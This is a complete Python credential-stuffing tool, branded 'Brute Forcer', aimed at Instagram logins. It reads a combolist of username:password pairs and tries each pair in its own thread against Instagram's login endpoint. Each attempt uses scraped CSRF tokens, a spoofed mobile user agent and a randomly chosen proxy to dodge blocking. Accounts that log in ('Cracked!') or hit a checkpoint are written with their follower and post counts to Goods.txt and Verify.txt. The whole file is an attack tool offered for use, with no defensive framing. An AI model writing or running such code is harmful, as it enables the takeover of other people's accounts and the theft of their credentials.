#!/usr/bin/python3
# -*- coding: utf-8 -*-
import requests, re, os, time, threading, random, json

RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
WHITE = '\033[37m'
UNDERLINE = '\033[4m'
RUNDERLINE = '\033[24m'
GRAY = '\033[90m'

def Print_Logo():
	Logo = '''


	{Y} :'######::'##::::'##::::'###::::'##:::'##::::'###::::'##::: ##:
	{Y} '##... ##: ##:::: ##:::'## ##:::. ##:'##::::'## ##::: ###:: ##:
	{G}  ##:::..:: ##:::: ##::'##:. ##:::. ####::::'##:. ##:: ####: ##:
	{G} . ######:: #########:'##:::. ##:::. ##::::'##:::. ##: ## ## ##:
	{M} :..... ##: ##.... ##: #########:::: ##:::: #########: ##. ####:
	{M} '##::: ##: ##:::: ##: ##.... ##:::: ##:::: ##.... ##: ##:. ###:
	{C} . ######:: ##:::: ##: ##:::: ##:::: ##:::: ##:::: ##: ##::. ##:
	{C} :......:::..:::::..::..:::::..:::::..:::::..:::::..::..::::..::
							 	
		       {U}{Y}~ {G}Brute Forcer {M}- {G}By .::Shayan::. {Y}~{UR}\n\n'''.format(Y=YELLOW,M=MAGENTA,G=GREEN,GR=GRAY,C=CYAN,U=UNDERLINE,UR=RUNDERLINE)
	for Line in Logo.splitlines():
		time.sleep(0.05)
		print(Line)

def Clear():
	if os.name == 'nt':
		os.system('cls')
		os.system('title Brute Forcer - By .::Shayan::.')
	else:
		os.system('clear')

def login_headers():
	sess = requests.session()
	r = sess.get('https://www.instagram.com/')
	mid = r.cookies['mid']
	csrf = r.cookies['csrftoken']
	ajax = re.findall('},"rollout_hash":"(.*)","bundle_variant":"', r.text)[0]
	header = {
		'accept': '*/*',
		'accept-encoding': 'gzip, deflate, br',
		'accept-language': 'en-US,en;q=0.9',
		'content-type': 'application/x-www-form-urlencoded',
		'cookie': 'ig_cb=1; csrftoken='+csrf+'; rur=FTW; mid='+mid,
		'origin': 'https://www.instagram.com',
		'referer': 'https://www.instagram.com/accounts/login/',
		'user-agent': 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Mobile Safari/537.36',
		'x-csrftoken': csrf,
		'x-ig-app-id': '1217981644879628',
		'x-instagram-ajax': ajax,
		'x-requested-with': 'XMLHttpRequest'
	}
	return header

def cap(user,proxy):
	sess = requests.session()
	r = sess.get('https://instagram.com/'+user).text
	followers = str(re.findall(',"edge_followed_by":{"count":(.*)},"followed_by_viewer":', r)[0])
	following = str(re.findall(',"edge_follow":{"count":(.*)},"follows_viewer":', r)[0])
	posts = str(re.findall(',"edge_owner_to_timeline_media":{"count":(.*),"page_info":{"has_next_page":', r)[0]).split(',')[0]
	return followers,following,posts

def Login(user,pas,proxy):
	try:
		payload = {
			'username': user,
			'password': pas
		}
		header = login_headers()
		prox = {
			'http': proxy,
			'https': proxy
		}
		sess = requests.session()
		r = sess.post('https://www.instagram.com/accounts/login/ajax/',headers=header,data=payload,proxies=prox)
		if '"authenticated": true,' in r.text or '{"authenticated": true' in r.text or 'authenticated": true,' in r.text:
			f,f2,p = cap(user,prox)
			print(YELLOW+'\n   ['+MAGENTA+'+'+YELLOW+']'+GREEN+user+':'+pas+WHITE+' -> '+GREEN+'Cracked!')
			print(YELLOW+'      ['+MAGENTA+'#'+YELLOW+']'+GREEN+'Followers'+WHITE+': '+CYAN+f)
			print(YELLOW+'      ['+MAGENTA+'#'+YELLOW+']'+GREEN+'Following'+WHITE+': '+CYAN+f2)
			print(YELLOW+'      ['+MAGENTA+'#'+YELLOW+']'+GREEN+'Posts'+WHITE+': '+CYAN+p)
			open('Goods.txt','a').write(user+':'+pas+'\nFollowers: '+f+'\nFollowing: '+f2+'\nPosts:' +p+'\n=======================\n')

		elif 'checkpoint_required' in r.text or '{"message": "checkpoint_required"' in r.text:
			f,f2,p = cap(user,prox)
			print(YELLOW+'\n   ['+MAGENTA+'~'+YELLOW+']'+GREEN+user+':'+pas+WHITE+' -> '+YELLOW+'Has a Verify!')
			open('Verify.txt','a').write(user+':'+pas+'\nFollowers: '+f+'\nFollowing: '+f2+'\nPosts:' +p+'\n=======================\n')
			print(YELLOW+'      ['+MAGENTA+'#'+YELLOW+']'+GREEN+'Followers'+WHITE+': '+CYAN+f)
			print(YELLOW+'      ['+MAGENTA+'#'+YELLOW+']'+GREEN+'Following'+WHITE+': '+CYAN+f2)
			print(YELLOW+'      ['+MAGENTA+'#'+YELLOW+']'+GREEN+'Posts'+WHITE+': '+CYAN+p) 
		else:
			print(YELLOW+'\n   ['+MAGENTA+'-'+YELLOW+']'+GREEN+user+':'+pas+WHITE+' -> '+RED+'Bad Account!')
	except:
		print(YELLOW+'\n   ['+MAGENTA+'-'+YELLOW+']'+GREEN+proxy+WHITE+' -> '+RED+'Proxy Is Bad!')

def Main():
	Clear()
	Print_Logo()
	print(YELLOW+' ['+MAGENTA+'*'+YELLOW+']'+GREEN+'Enter Combolist Path')
	combo = input(YELLOW+'  > '+GREEN)
	combo = open(combo,'r').read().splitlines()
	print(YELLOW+'\n ['+MAGENTA+'*'+YELLOW+']'+GREEN+'Enter Proxylist Path')
	proxy = input(YELLOW+'  > '+GREEN)
	proxy = open(proxy,'r').read().splitlines()
	Clear()
	Print_Logo()
	print(YELLOW+'\n ['+MAGENTA+'*'+YELLOW+']'+GREEN+'Brute Forcing....\n\n')
	thread_list = []
	for acc in combo:
		t = threading.Thread(target=Login,args=(acc.split(':')[0],acc.split(':')[1],random.choice(proxy,)))
		thread_list.append(t)
		t.start()
	for i in thread_list:
		i.join()
	print(YELLOW+'\n\n ['+MAGENTA+'!'+YELLOW+']'+GREEN+'Finished.')					
	input('{Y}  [{M}!{Y}]{G}Press `{B}Enter{G}` To Continue...'.format(Y=YELLOW,M=MAGENTA,G=GREEN,B=BLUE))

while True:
	Main()
